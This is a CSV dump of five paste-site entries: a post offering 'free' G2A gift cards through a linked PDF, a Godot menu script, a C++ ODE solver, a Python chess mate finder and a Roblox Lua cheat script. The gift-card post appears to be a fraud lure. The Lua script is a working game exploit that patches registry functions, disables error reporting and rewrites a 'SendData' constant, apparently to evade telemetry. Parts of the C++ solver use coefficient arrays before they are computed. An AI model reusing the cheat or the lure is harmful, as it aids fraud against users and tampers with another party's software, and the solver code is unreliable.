id,title,username,language,date,content
Mee0aKmN,G2A.com Free Gift Card Guide Mar 2024 FIX,HastyBasher0,GetText,Saturday 16th of March 2024 01:04:24 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

IMPORTANT: If you use this make sure to use the English version of G2A.com otherwise this will not work!

You can buy gift cards directly with it or you can buy popular games then put them on fresh steam accounts and then sell those accounts.
 
PDF guide here:
https://smallpdf.com/file#s=cea149fd-ead1-4939-94cf-d10a8ce7936a
 
Working as of:
16 March 2024















































"
9dKsyMkL,MenuHandler.gd,Nancok,GDScript,Saturday 16th of March 2024 01:02:04 PM CDT,"extends Node2D
class_name MainMenuHandler

enum Transitions {
	INTERPOLATE,
	FADE_TO
}

const DEFAULT_ANIM_DURATION: float = 0.5


@export var menu_defs: Array[MenuDefinition]


var menu_active: MenuDefinition

var running_tweens: Array[Tween]


func get_view_quadrant(quadrant: Vector2i = Vector2i.ZERO) -> Vector2:
	var output: Vector2 = Vector2(
		get_viewport_rect().size.x * quadrant.x - 1,
		get_viewport_rect().size.y * quadrant.y - 1
	)
	return output

func change_to_menu(menu: MenuDefinition):
	get_viewport().gui_release_focus()
	for tween: Tween in running_tweens:
		if is_instance_valid(tween):
			tween.kill()
	
	
	match menu.transition:
		Transitions.INTERPOLATE:
			anim_interpolate_view(menu.position)
		
		Transitions.FADE_TO:
			anim_fade_move_view(menu.position)

	menu_active = menu
	
	
func anim_interpolate_view(to: Vector2, duration: float = DEFAULT_ANIM_DURATION):
	var tween: Tween = create_tween()
	tween.tween_property(get_viewport(), ""canvas_transform:origin"", to, duration)

func anim_fade_move_view(to: Vector2, duration: float = DEFAULT_ANIM_DURATION):
	var color_rect : = ColorRect.new()

class MenuDefinition extends Node2D:
	var main_node: Node
	var view_pos: Vector2
	var anim_duration: float = DEFAULT_ANIM_DURATION
	var transition: Transitions

	func _init(_main_node: Node):
		main_node
"
Z29fnkeS,new_ode,maxim_shlyahtin,C++,Saturday 16th of March 2024 12:25:19 PM CDT,"#include <cmath>
#include <cstdio>
#include <iostream>
#include <vector>
#include <chrono>

class RungeKutta {
protected:
    double t;
    std::vector<double> X, XH, K1, K2, K3, K4, FX;

public:
    RungeKutta(uint32_t N) {
        Init(N);
    }

    double getX(uint32_t index) {
        return X.at(index);
    }

    void Init(uint32_t N) {
        X.resize(N);
        XH.resize(N);
        K1.resize(N);
        K2.resize(N);
        K3.resize(N);
        K4.resize(N);
        FX.resize(N);
    }

    void SetInit(double t0, std::vector<double> X0) {
        t = t0;
        if (X.empty()) Init(X0.size());
        for (size_t i = 0; i < X.size(); i++)
            X[i] = X0[i];
    }

    virtual std::vector<double> F(double t, std::vector<double> X) = 0;

    void NextStep(double h) {
        if (h < 0) return;

        K1 = F(t, X);

        for (size_t i = 0; i < X.size(); i++)
            XH[i] = X[i] + K1[i] * (h / 2.0);

        K2 = F(t + h / 2.0, XH);

        for (size_t i = 0; i < X.size(); i++)
            XH[i] = X[i] + K2[i] * (h / 2.0);

        K3 = F(t + h / 2.0, XH);

        for (size_t i = 0; i < X.size(); i++)
            XH[i] = X[i] + K3[i] * h;

        K4 = F(t + h, XH);

        for (size_t i = 0; i < X.size(); i++)
            X[i] = X[i] + h / 6.0 * (K1[i] + 2.0 * K2[i] + 2.0 * K3[i] + K4[i]);

        t = t + h;
    }
};

class DOPRI8 {
protected:
    double t;
    std::vector<double> X, XH, K1, K2, K3, K4, K5, K6,
        K7, K8, K9, K10, K11, K12, K13, FX;

public:
    DOPRI8(uint32_t N) {
        Init(N);
    }

    double getX(uint32_t index) {
        return X.at(index);
    }

    void Init(uint32_t N) {
        X.resize(N);
        XH.resize(N);
        K1.resize(N);
        K2.resize(N);
        K3.resize(N);
        K4.resize(N);
        K5.resize(N);
        K6.resize(N);
        K7.resize(N);
        K8.resize(N);
        K9.resize(N);
        K10.resize(N);
        K11.resize(N);
        K12.resize(N);
        K13.resize(N);
        FX.resize(N);
    }

    void SetInit(double t0, std::vector<double> X0) {
        t = t0;
        if (X.empty()) Init(X0.size());
        for (size_t i = 0; i < X.size(); i++)
            X[i] = X0[i];
    }

    virtual std::vector<double> F(double t, std::vector<double> X) = 0;

    void NextStep(double h) {
        if (h < 0) return;

        K1 = F(t + h, X);

        for (size_t i = 0; i < X.size(); i++)
            XH[i] = X[i] + K1[i] * (h / 18.0);

        K2 = F(t + h / 18.0, XH);

        for (size_t i = 0; i < X.size(); i++)
            XH[i] = X[i] + K2[i] * (h / 48.0 + h / 16.0);

        K3 = F(t + h / 48.0 + h / 16.0, XH);

        for (size_t i = 0; i < X.size(); i++)
            XH[i] = X[i] + K3[i] * (h / 32.0 + 3 * h / 32.0);

        K4 = F(t + h / 32.0 + 3 * h / 32.0, XH);

        for (size_t i = 0; i < X.size(); i++)
            XH[i] = X[i] + K4[i] * (5 * h / 16.0 - 75.0 * h / 64.0 + 75.0 * h / 64.0);

        K5 = F(t + 5 * h / 16.0 - 75.0 * h / 64.0 + 75.0 * h / 64.0, XH);

        for (size_t i = 0; i < X.size(); i++)
            XH[i] = X[i] + K5[i] * (3 * h / 80.0 + 3.0 * h / 16.0 + 3.0 * h / 20.0);

        K6 = F(t + 3 * h / 80.0 + 3.0 * h / 16.0 + 3.0 * h / 20.0, XH);

        for (size_t i = 0; i < X.size(); i++)
            XH[i] = X[i] + K7[i] * (29443841.0 * h / 614563906.0 +
                77736538.0 * h / 77736538.0 - 28693883.0 * h / 1125000000.0 + 23124283.0 * h / 1800000000.0);

        K7 = F(t + 29443841.0 * h / 614563906.0 +
            77736538.0 * h / 77736538.0 - 28693883.0 * h / 1125000000.0 + 23124283.0 * h / 1800000000.0, XH);

        std::vector<double> T1 = { 16016141.0 / 946692911.0, 0.0, 0.0, 61564180.0 / 158732637.0, 22789713.0 / 633445777.0, 545815736.0 / 2771057229.0, -180193667.0 / 1043307555.0 };

        double t1 = 0.0;
        for (const auto& num : T1)
            t1 += h * num;

        for (size_t i = 0; i < X.size(); i++)
            XH[i] = X[i] + K8[i] * t1;

        K8 = F(t + t1, XH);

        std::vector<double> T2 = { 39632708.0 / 573591083.0, 0.0, 0.0, -433636366.0 / 683701615.0, -421739975.0 / 2616292301.0, 100302831.0 / 723423059.0, 790204164.0 / 839813087.0, 800635310.0 / 3783071287.0 };

        double t2 = 0.0;
        for (const auto& num : T2)
            t2 += h * num;

        for (size_t i = 0; i < X.size(); i++)
            XH[i] = X[i] + K9[i] * t2;

        K9 = F(t + t2, XH);

        std::vector<double> T3 = { 246121993.0 / 1340847787.0, 0.0, 0.0, -37695042795.0 / 15268766246.0, -309121744.0 / 1061227803.0, -12992083.0 / 490766935.0, 6005943493.0 / 2108947869.0, 393006217.0 / 1396673457.0, 123872331.0 / 1001029789.0 };

        double t3 = 0.0;
        for (const auto& num : T3)
            t3 += h * num;

        for (size_t i = 0; i < X.size(); i++)
            XH[i] = X[i] + K10[i] * t3;

        K10 = F(t + t3, XH);

        std::vector<double> T4 = { -1028468189.0 / 846180014.0, 0.0, 0.0, 8478235783.0 / 508512852.0, 1311729495.0 / 1432422823.0, -10304129995.0 / 1701304382.0, -48777925059.0 / 3047939560.0, 15336726248.0 / 1032824649.0, -45442868181.0 / 3398467696.0, 3065993473.0 / 597172653.0 };

        double t4 = 0.0;
        for (const auto& num : T4)
            t4 += h * num;

        for (size_t i = 0; i < X.size(); i++)
            XH[i] = X[i] + K11[i] * t4;

        K11 = F(t + t4, XH);

        std::vector<double> T5 = { 185892177.0 / 718116043.0, 0.0, 0.0, -3185094517.0 / 667107341.0, -477755414.0 / 1098053517.0, -703635378.0 / 230739211.0, 5731566787.0 / 1027545527.0, 5232866602.0 / 850066563.0, -4093664535.0 / 808688257.0, 3962137247.0 / 1805957418.0, 65686358.0 / 487910083.0 };

        double t5 = 0.0;
        for (const auto& num : T5)
            t5 += h * num;

        for (size_t i = 0; i < X.size(); i++)
            XH[i] = X[i] + K12[i] * t5;

        K12 = F(t + t5, XH);

        std::vector<double> T6 = { 403863854.0 / 491063109.0, 0.0, 0.0, -5068492393.0 / 434740067.0, -411421997.0 / 543043805.0, 652783627.0 / 914296604.0, 11173962825.0 / 925320556.0, -13158990841.0 / 6184727034.0, 3936647629.0 / 1978049680.0, -160528059.0 / 685178525.0, 248638103.0 / 1413531060.0, 0.0 };

        double t6 = 0.0;
        for (const auto& num : T6)
            t6 += h * num;

        for (size_t i = 0; i < X.size(); i++)
            XH[i] = X[i] + K13[i] * t6;

        K13 = F(t + t6, XH);

        std::vector<double> Tb = { 14005451.0 / 335480064.0, 0.0, 0.0, 0.0, 0.0, -59238493.0 / 1068277825.0, 181606767.0 / 758867731.0, 561292985.0 / 797845732.0, -1041891430.0 / 1371343529.0, 760417239.0 / 1151165299.0, 118820643.0 / 751138087.0, -528747749.0 / 2220607170.0, 1.0 / 4.0 };

        for (size_t i = 0; i < X.size(); i++)
            X[i] = X[i] + h * (K1[i] * Tb[0] + K2[i] * Tb[1] + K3[i] * Tb[2] + K4[i] * Tb[3] + K5[i] * Tb[4] + K6[i] * Tb[5] + K7[i] * Tb[6] + K8[i] * Tb[7] + K9[i] * Tb[8] + K10[i] * Tb[9] + K11[i] * Tb[10] + K12[i] * Tb[11] + K13[i] * Tb[12]);

        t = t + h;
    }
};

class TA : public DOPRI8 {
private:

    const double b = 0.15; // bifurcation parameter

public:
    TA(uint32_t N) : DOPRI8(N) {}

    std::vector<double> F(double h, std::vector<double> X) override {
        FX[0] = sin(X[1]) - b * X[0];
        FX[1] = sin(X[2]) - b * X[1];
        FX[2] = sin(X[0]) - b * X[2];
        return FX;
    }

    static void Test() {
        double dt = 0.001;
        TA task(3);
        int n = 0;
        std::vector<double> X0 = { 0, 1, 0 };
        task.SetInit(0, X0);
        while (n < 20000) {
            n++;
            std::cout << n <<"" Time = "" << task.t << ""; x = "" << task.X[0] << ""; y = "" << task.X[1] << ""; z = "" << task.X[2] << '\n';
            task.NextStep(dt);
        }
    }
};



int main() {
    auto start = std::chrono::steady_clock::now();
    TA::Test();
    auto end = std::chrono::steady_clock::now();
    std::cout << ""time "" << std::chrono::duration_cast<std::chrono::seconds>(end - start).count() << "" sec\n"";
    return 0;
}"
0jK3VRCJ,quite good moves_to_mate 14 but is 10,max2201111,Python,Saturday 16th of March 2024 12:22:28 PM CDT,"import chess

def simplify_fen(fen):
    """"""Simplifies a FEN string to include only position, turn, castling availability, and en passant target.""""""
    return ' '.join(fen.split(' ')[:4])

def initialize_game_tree(initial_fen):
    """"""Initializes the game tree with the root node based on the initial FEN.""""""
    simplified_fen = simplify_fen(initial_fen)
    game_tree = {1: {'fen': simplified_fen, 'parent': None, 'color': chess.WHITE if 'w' in initial_fen else chess.BLACK, 'children': [], 'moves_to_mate': None}}
    fen_to_node_id = {simplified_fen: 1}
    return game_tree, fen_to_node_id

def add_descendants_iteratively(game_tree, fen_to_node_id):
    """"""Expands the game tree by iteratively adding legal move descendants of each game state.""""""
    queue = [(1, 0)]
    while queue:
        node_id, _ = queue.pop(0)
        board = chess.Board(game_tree[node_id]['fen'] + "" 0 1"")
        for move in board.legal_moves:
            board.push(move)
            simplified_fen = simplify_fen(board.fen())
            if simplified_fen not in fen_to_node_id:
                new_node_id = len(game_tree) + 1
                game_tree[new_node_id] = {'fen': simplified_fen, 'parent': node_id, 'color': chess.WHITE if board.turn else chess.BLACK, 'children': [], 'moves_to_mate': None}
                fen_to_node_id[simplified_fen] = new_node_id
                game_tree[node_id]['children'].append(new_node_id)
                queue.append((new_node_id, 0))
            board.pop()

def update_game_outcomes(game_tree):
    """"""Updates game outcomes focusing only on checkmates.""""""
    for node_id, node in game_tree.items():
        board = chess.Board(node['fen'] + "" 0 1"")
        if board.is_checkmate():
            node['result'] = 1 if board.turn == chess.BLACK else -1  # Black's turn but checkmate means White wins, and vice versa
            node['moves_to_mate'] = 0  # Checkmate is immediate, no more moves required.
        elif board.is_game_over():
            node['result'] = 0  # For draws or stalemates, we consider the result as 0 (this will be ignored in propagation)

# def update_parent_preferences(game_tree):
#     """"""Propagates the best outcome for each node up the game tree, prioritizing checkmates and updating moves to mate.""""""
#     def recurse(node_id):
#         node = game_tree[node_id]
#         if 'result' in node and node['result'] in [-1, 1]:  # Checkmate detected
#             return node['result'], [node_id], 0 if 'moves_to_mate' in node else None

#         best_result = None
#         best_path = []
#         best_moves_to_mate = None
#         for child_id in node['children']:
#             child_result, child_path, child_moves_to_mate = recurse(child_id)
            
#             if child_moves_to_mate is not None:
#                 child_moves_to_mate += 1  # Increment moves to mate since we move up the tree
                
#                 if best_moves_to_mate is None or (node['color'] == chess.WHITE and child_result == 1 and child_moves_to_mate < best_moves_to_mate) or (node['color'] == chess.BLACK and child_result == -1 and child_moves_to_mate > best_moves_to_mate):
#                     best_result, best_path, best_moves_to_mate = child_result, child_path, child_moves_to_mate

#         if best_result in [-1, 1]:
#             node['result'] = best_result
#             node['moves_to_mate'] = best_moves_to_mate
#         else:
#             node['result'] = 0  # Default to draw if no win/loss is found

#         return node.get('result', 0), [node_id] + best_path, node.get('moves_to_mate', None)

#     result, path, moves_to_mate = recurse(1)  # Start the recursion from the root node.
#     return path

def update_parent_preferences(game_tree):
    """"""Updates the parent preferences for each node up the game tree, prioritizing checkmates.""""""
    def recurse(node_id):
        node = game_tree[node_id]
        if 'result' in node and node['result'] in [-1, 1]:  # Direct checkmate detected
            return node['result'], [node_id], 0

        best_result = None
        best_path = []
        # Initialize moves_to_mate with a large number for comparison
        best_moves_to_mate = float('inf') if node['color'] == chess.WHITE else -float('inf')

        for child_id in node['children']:
            child_result, child_path, child_moves_to_mate = recurse(child_id)

            # Update for WHITE (minimizing moves to mate) or BLACK (maximizing moves to mate)
            if child_moves_to_mate is not None:
                updated = False
                if node['color'] == chess.WHITE and child_result == 1:
                    if best_moves_to_mate > child_moves_to_mate:
                        best_moves_to_mate = child_moves_to_mate
                        updated = True
                elif node['color'] == chess.BLACK and child_result == -1:
                    if best_moves_to_mate < child_moves_to_mate:
                        best_moves_to_mate = child_moves_to_mate
                        updated = True

                if updated:
                    best_result = child_result
                    best_path = child_path

        # If no checkmate path was found, revert moves_to_mate to None and set result to draw
        if best_moves_to_mate == float('inf') or best_moves_to_mate == -float('inf'):
            best_moves_to_mate = None
            best_result = 0

        if best_result in [-1, 1]:
            node['moves_to_mate'] = best_moves_to_mate + 1 if best_moves_to_mate is not None else None
        else:
            node['result'] = 0  # Default to draw if no win/loss is found
            node['moves_to_mate'] = None

        return best_result, [node_id] + best_path, node.get('moves_to_mate')

    # Execute the recursive function starting from the root node.
    result, path, moves_to_mate = recurse(1)
    return path

# Ensure you call this function in your main to see the corrected output.


def print_path(game_tree, path):
    """"""Prints the board positions along the path.""""""
    for node_id in path:
        node = game_tree[node_id]
        board = chess.Board(node['fen'] + "" 0 1"")
        moves_to_mate = ""N/A"" if node.get('moves_to_mate') is None else node.get('moves_to_mate')
        print(f""Node ID: {node_id}, Result: {node.get('result', 'N/A')}, Moves to Mate: {moves_to_mate}"")
        print(board)
        print(""---"")

def main():
    initial_fen = ""8/8/8/3k4/8/8/2K2Q2/8 w - - 0 1""  # Example FEN
    initial_fen = ""8/8/8/3k4/8/2K5/5q2/8 w - - 0 1""

    game_tree, fen_to_node_id = initialize_game_tree(initial_fen)
    add_descendants_iteratively(game_tree, fen_to_node_id)
    update_game_outcomes(game_tree)
    path = update_parent_preferences(game_tree)
    print(game_tree[1])
    print(""Path to the outcome:"")
    print_path(game_tree, path)

if __name__ == ""__main__"":
    main()
"
rSL6fRRa,Untitled,Demchel,Lua,Saturday 16th of March 2024 12:16:20 PM CDT,"getupvalues = getupvalues or debug.getupvalues
setupvalue = setupvalue or debug.setupvalue
if not (getrawmetatable and getupvalues and setupvalue and (getreg or debug.getregistry)) then
	local h = Instance.new(""Hint"",workspace)
	h.Text = ""Incompatible exploit.""
	wait(3)
	h:Destroy()
	return
end
local settings = {refill_at=0, refill_end=60, deliver_at=24, stay_in_kitchen=true}
local doCashier,doBoxer,doCook,doSupplier,doDelivery = true,true,true,true,true
if readfile then
	pcall(function()
		local new = game:GetService(""HttpService""):JSONDecode(readfile(""PizzaFarm.txt""))
		--corruption?
		local doOverwrite=false
		for k,v in pairs(new) do
			if settings[k]==nil then
				doOverwrite=true
				new[k]=nil
			end
		end
		for k,v in pairs(settings) do
			if new[k]==nil then
				doOverwrite=true
				new[k]=v
			end
		end
		--use input
		if doOverwrite then
			warn(""Settings overwritten"")
			writefile(""PizzaFarm.txt"",game:GetService(""HttpService""):JSONEncode(new))
		end
		settings = new
	end)
end

if getconnections then
	for _,c in next,getconnections(game:GetService(""ScriptContext"").Error) do
		c:Disable()
	end
end

local player = game:GetService(""Players"").LocalPlayer
local ffc = game.FindFirstChild
local RNG = Random.new()
local network
local character,root,humanoid
do
	local reg = (getreg or debug.getregistry)()
	for i=1,#reg do
		local f = reg[i]
		if type(f)==""function"" then
		    for k,v in next,getupvalues(f) do
				if typeof(v)==""Instance"" then
				    if v.Name==""CashOut"" then
					    setupvalue(f,k,{MouseButton1Click={wait=function()end,Wait=function()end}})
				    elseif v.Name==""StickerName"" then
				        setupvalue(f,k,nil)
				    end
				end
			end
    		if tostring(getfenv(f).script) == ""Music"" then
    		    local consts = getconstants(f)
    		    local loc=false
		        for ci,c in next,consts do
		            if c == ""location changed"" then
		                loc=true
		            elseif loc and c == ""SendData"" then
		                setconstant(f,ci,""ExplodeString"")
		                break
		            end
		        end
    		end
		elseif type(f)==""table"" and rawget(f,""FireServer"") and rawget(f,""BindEvents"") then
			network = f
		end
	end
end
assert(network,""failed to find network"")
--//gui
Create = function(class,parent,props)
	local new = Instance.new(class)
	for k,v in next,props do
		new[k]=v
	end
	new.Parent = parent
	return new
end
gui=Create(""ScreenGui"",game.CoreGui,{Name=""Farm"", ZIndexBehavior=""Sibling""})
main=Create(""Frame"",gui,{Name=""main"", Draggable=true, Active=true, Size=UDim2.new(0,350,0,100), Position=UDim2.new(.335,0,0.02,0), BackgroundColor3=Color3.new(0.098,0.098,0.098)})
topbar=Create(""Frame"",main,{Name=""topbar"", Size=UDim2.new(1,0,0.15,0), BackgroundColor3=Color3.new(0.255,0.255,0.255)})
closeBtn=Create(""TextButton"",topbar,{Name=""closeBtn"", TextWrapped=true, Size=UDim2.new(0.03,0,1,0), TextColor3=Color3.new(1,1,1), Text=""X"", BackgroundTransparency=1, 
	Font=""GothamSemibold"", Position=UDim2.new(0.96,0,0,0), TextSize=14, TextScaled=true, BackgroundColor3=Color3.new(1,1,1)})
titleLbl=Create(""TextLabel"",topbar,{Name=""titleLbl"", TextWrapped=true, Size=UDim2.new(0.5,0,1,0), Text=""Пицца Комбинат"", TextSize=14, Font=""GothamSemibold"", 
	BackgroundTransparency=1, Position=UDim2.new(0.25,0,0,0), TextColor3=Color3.new(1,1,1), BackgroundColor3=Color3.new(1,1,1)})
saveBtn=Create(""ImageButton"",topbar,{Name=""saveBtn"", Image=""rbxassetid://55687833"", Size=UDim2.new(0.05,0,1,0), Position=UDim2.new(0.01,0,0,0), BackgroundTransparency=1, BackgroundColor3=Color3.new(), Visible=writefile~=nil})
settings_1=Create(""Frame"",main,{Name=""settings"", BackgroundTransparency=1, Size=UDim2.new(0.97,0,0.75,0), Position=UDim2.new(0.025,0,0.2,0), BackgroundColor3=Color3.new(1,1,1)})
Layout=Create(""UIGridLayout"",settings_1,{VerticalAlignment=""Center"", SortOrder=""LayoutOrder"", HorizontalAlignment=""Center"", CellPadding=UDim2.new(0.01,0,0.1,0), CellSize=UDim2.new(0.325,0,0.26,0)})
cashier=Create(""Frame"",settings_1,{Name=""cashier"", LayoutOrder=4, BackgroundTransparency=1, Size=UDim2.new(0,100,0,100), BackgroundColor3=Color3.new(1,1,1)})
Label=Create(""TextLabel"",cashier,{TextWrapped=true, Size=UDim2.new(0.6,0,1,0), Text=""Кассир"", TextSize=14, TextXAlignment=""Left"", Font=""SourceSans"", 
	BackgroundTransparency=1, Position=UDim2.new(0.4,0,0,0), TextColor3=Color3.new(1,1,1), TextScaled=true, BackgroundColor3=Color3.new(1,1,1)})
cashierBtn=Create(""ImageButton"",cashier,{Name=""cashierBtn"", ImageTransparency=1, BorderSizePixel=0, Size=UDim2.new(0.38,0,1,0), BackgroundColor3=Color3.new(0.392,0.392,0.392)})
cashierSlider=Create(""Frame"",cashierBtn,{Name=""slider"", Size=UDim2.new(0.5,-4,1,-4), Position=UDim2.new(doCashier and 0.5 or 0,2,0,2), BorderSizePixel=0, BackgroundColor3=Color3.new(0.784,0.784,0.784)})
kitchen=Create(""Frame"",settings_1,{Name=""kitchen"", LayoutOrder=9, BackgroundTransparency=1, Size=UDim2.new(0,100,0,100), BackgroundColor3=Color3.new(1,1,1)})
Label_2=Create(""TextLabel"",kitchen,{TextWrapped=true, Size=UDim2.new(0.6,0,1,0), Text=""Доставлять от:"", TextSize=14, TextXAlignment=""Right"", Font=""SourceSans"", 
	BackgroundTransparency=1, TextColor3=Color3.new(1,1,1), TextScaled=true, BackgroundColor3=Color3.new(1,1,1)})
deliverAtBox=Create(""TextBox"",kitchen,{Name=""deliverAtBox"", TextWrapped=true, Size=UDim2.new(0.25,0,1,0), Text=tostring(settings.deliver_at), TextSize=50, TextColor3=Color3.new(), 
	Font=""Code"", Position=UDim2.new(0.62,0,0,0), TextScaled=true, BackgroundColor3=Color3.new(0.784,0.784,0.784)})
refillEnd=Create(""Frame"",settings_1,{Name=""refillEnd"", LayoutOrder=8, BackgroundTransparency=1, Size=UDim2.new(0,100,0,100), BackgroundColor3=Color3.new(1,1,1)})
refillEndBox=Create(""TextBox"",refillEnd,{Name=""refillEndBox"", TextWrapped=true, Size=UDim2.new(0.25,0,1,0), Text=tostring(settings.refill_end), TextSize=50, TextColor3=Color3.new(), 
	Font=""Code"", Position=UDim2.new(0.62,0,0,0), TextScaled=true, BackgroundColor3=Color3.new(0.784,0.784,0.784)})
Label_3=Create(""TextLabel"",refillEnd,{TextWrapped=true, Size=UDim2.new(0.6,0,1,0), Text=""Заполнять до:"", TextSize=14, TextXAlignment=""Right"", Font=""SourceSans"", 
	BackgroundTransparency=1, TextColor3=Color3.new(1,1,1), TextScaled=true, BackgroundColor3=Color3.new(1,1,1)})
refillAt=Create(""Frame"",settings_1,{Name=""refillAt"", LayoutOrder=7, BackgroundTransparency=1, Size=UDim2.new(0,100,0,100), BackgroundColor3=Color3.new(1,1,1)})
Label_4=Create(""TextLabel"",refillAt,{TextWrapped=true, Size=UDim2.new(0.5,0,1,0), Text=""Заполнять от:"", TextSize=14, TextXAlignment=""Right"", Font=""SourceSans"", 
	BackgroundTransparency=1, TextColor3=Color3.new(1,1,1), TextScaled=true, BackgroundColor3=Color3.new(1,1,1)})
refillAtBox=Create(""TextBox"",refillAt,{Name=""refillAtBox"", TextWrapped=true, Size=UDim2.new(0.25,0,1,0), Text=tostring(settings.refill_at), TextSize=50, TextColor3=Color3.new(), 
	Font=""Code"", Position=UDim2.new(0.52,0,0,0), TextScaled=true, BackgroundColor3=Color3.new(0.784,0.784,0.784)})
supplier=Create(""Frame"",settings_1,{Name=""supplier"", LayoutOrder=6, BackgroundTransparency=1, Size=UDim2.new(0,100,0,100), BackgroundColor3=Color3.new(1,1,1)})
Label_5=Create(""TextLabel"",supplier,{TextWrapped=true, Size=UDim2.new(0.6,0,1,0), Text=""Поставщик"", TextSize=14, TextXAlignment=""Left"", Font=""SourceSans"", 
	BackgroundTransparency=1, Position=UDim2.new(0.4,0,0,0), TextColor3=Color3.new(1,1,1), TextScaled=true, BackgroundColor3=Color3.new(1,1,1)})
supplierBtn=Create(""ImageButton"",supplier,{Name=""supplierBtn"", ImageTransparency=1, BorderSizePixel=0, Size=UDim2.new(0.38,0,1,0), BackgroundColor3=Color3.new(0.392,0.392,0.392)})
supplierSlider=Create(""Frame"",supplierBtn,{Name=""slider"", Size=UDim2.new(0.5,-4,1,-4), Position=UDim2.new(doSupplier and 0.5 or 0,2,0,2), BorderSizePixel=0, BackgroundColor3=Color3.new(0.784,0.784,0.784)})
delivery=Create(""Frame"",settings_1,{Name=""delivery"", LayoutOrder=5, BackgroundTransparency=1, Size=UDim2.new(0,100,0,100), BackgroundColor3=Color3.new(1,1,1)})
Label_6=Create(""TextLabel"",delivery,{TextWrapped=true, Size=UDim2.new(0.6,0,1,0), Text=""Доставщик"", TextSize=14, TextXAlignment=""Left"", Font=""SourceSans"", 
	BackgroundTransparency=1, Position=UDim2.new(0.4,0,0,0), TextColor3=Color3.new(1,1,1), TextScaled=true, BackgroundColor3=Color3.new(1,1,1)})
deliveryBtn=Create(""ImageButton"",delivery,{Name=""deliveryBtn"", ImageTransparency=1, BorderSizePixel=0, Size=UDim2.new(0.38,0,1,0), BackgroundColor3=Color3.new(0.392,0.392,0.392)})
deliverySlider=Create(""Frame"",deliveryBtn,{Name=""slider"", Size=UDim2.new(0.5,-4,1,-4), Position=UDim2.new(doDelivery and 0.5 or 0,2,0,2), BorderSizePixel=0, BackgroundColor3=Color3.new(0.784,0.784,0.784)})
boxer=Create(""Frame"",settings_1,{Name=""boxer"", LayoutOrder=2, BackgroundTransparency=1, Size=UDim2.new(0,100,0,100), BackgroundColor3=Color3.new(1,1,1)})
boxerLbl=Create(""TextLabel"",boxer,{TextWrapped=true, Size=UDim2.new(0.6,0,1,0), Text=""Фасовщик"", TextSize=14, TextXAlignment=""Left"", Font=""SourceSans"", 
	BackgroundTransparency=1, Position=UDim2.new(0.4,0,0,0), TextColor3=Color3.new(1,1,1), TextScaled=true, BackgroundColor3=Color3.new(1,1,1)})
boxerBtn=Create(""ImageButton"",boxer,{Name=""boxerBtn"", ImageTransparency=1, BorderSizePixel=0, Size=UDim2.new(0.38,0,1,0), BackgroundColor3=Color3.new(0.392,0.392,0.392)})
boxerSlider=Create(""Frame"",boxerBtn,{Name=""slider"", Size=UDim2.new(0.5,-4,1,-4), Position=UDim2.new(doBoxer and 0.5 or 0,2,0,2), BorderSizePixel=0, BackgroundColor3=Color3.new(0.784,0.784,0.784)})
cook=Create(""Frame"",settings_1,{Name=""cook"", LayoutOrder=3, BackgroundTransparency=1, Size=UDim2.new(0,100,0,100), BackgroundColor3=Color3.new(1,1,1)})
cookLbl=Create(""TextLabel"",cook,{TextWrapped=true, Size=UDim2.new(0.6,0,1,0), Text=""Повар"", TextSize=14, TextXAlignment=""Left"", Font=""SourceSans"", 
	BackgroundTransparency=1, Position=UDim2.new(0.4,0,0,0), TextColor3=Color3.new(1,1,1), TextScaled=true, BackgroundColor3=Color3.new(1,1,1)})
cookBtn=Create(""ImageButton"",cook,{Name=""cookBtn"", ImageTransparency=1, BorderSizePixel=0, Size=UDim2.new(0.38,0,1,0), BackgroundColor3=Color3.new(0.392,0.392,0.392)})
cookSlider=Create(""Frame"",cookBtn,{Name=""slider"", Size=UDim2.new(0.5,-4,1,-4), Position=UDim2.new(doCook and 0.5 or 0,2,0,2), BorderSizePixel=0, BackgroundColor3=Color3.new(0.784,0.784,0.784)})
toggleAll=Create(""Frame"",settings_1,{Name=""toggleAll"", LayoutOrder=1, BackgroundTransparency=1, Size=UDim2.new(0,100,0,100), BackgroundColor3=Color3.new(1,1,1)})
switch=Create(""Frame"",toggleAll,{Name=""switch"", BackgroundTransparency=1, Size=UDim2.new(0.75,0,1,0), BackgroundColor3=Color3.new(1,1,1)})
allOffBtn=Create(""ImageButton"",switch,{Name=""allOffBtn"", ImageTransparency=1, BorderSizePixel=0, Size=UDim2.new(0.5,0,1,0), BackgroundColor3=Color3.new(0.235,0.235,0.235)})
allOnBtn=Create(""ImageButton"",switch,{Name=""allOnBtn"", ImageTransparency=1, BorderSizePixel=0, Size=UDim2.new(0.5,0,1,0), Position=UDim2.new(0.5,0,0,0), BackgroundColor3=Color3.new(0.333,0.333,0.333)})
toggleAllSlider=Create(""Frame"",switch,{Name=""slider"", Size=UDim2.new(0.1,0,1,4), Position=UDim2.new(0.45,0,0,-2), BorderSizePixel=0, BackgroundColor3=Color3.new(0.784,0.784,0.784)})
messageLbl=Create(""TextLabel"",topbar,{Name=""messageLbl"", Size=UDim2.new(0.5,0,1,0), Text=""Сохранено."", TextSize=14, Font=""GothamSemibold"", BackgroundTransparency=1, 
	Position=UDim2.new(0.07,0,0,0), TextColor3=Color3.new(1,1,1), Visible=false, TextXAlignment=""Left""})
camframe=Create(""Frame"",gui,{Name=""camframe"", BackgroundTransparency=1, Size=UDim2.new(0,120,0,40), Position=UDim2.new(0.5,-320,0,-38), BackgroundColor3=Color3.new(0.118,0.118,0.118)})
rightCamBtn=Create(""ImageButton"",camframe,{Name=""rightCamBtn"", Image=""rbxassetid://144168163"", Size=UDim2.new(0.333,0,1,0), Rotation=180, Position=UDim2.new(0.666,0,0,0), BackgroundTransparency=1, 
	BackgroundColor3=Color3.new(1,1,1)})
leftCamBtn=Create(""ImageButton"",camframe,{Name=""leftCamBtn"", Image=""rbxassetid://144168163"", Size=UDim2.new(0.333,0,1,0), BackgroundTransparency=1, BackgroundColor3=Color3.new(1,1,1)})
centerCamBtn=Create(""ImageButton"",camframe,{Name=""centerCamBtn"", Image=""rbxassetid://58282192"", Size=UDim2.new(0.333,0,1,0), Position=UDim2.new(0.333,0,0,0), BackgroundTransparency=1, BackgroundColor3=Color3.new(1,1,1)})
creditLbl=Create(""TextLabel"",main,{Position=UDim2.new(0,0,1,5),Size=UDim2.new(0,100,0,15),BackgroundTransparency=1,TextColor3=Color3.new(1,1,1),Text=""Тестовое издание"",TextScaled=true,TextStrokeTransparency=.8})

local function toggleCashier(bool)
	if bool~=nil then
		doCashier=bool
	else
		doCashier = not doCashier
	end
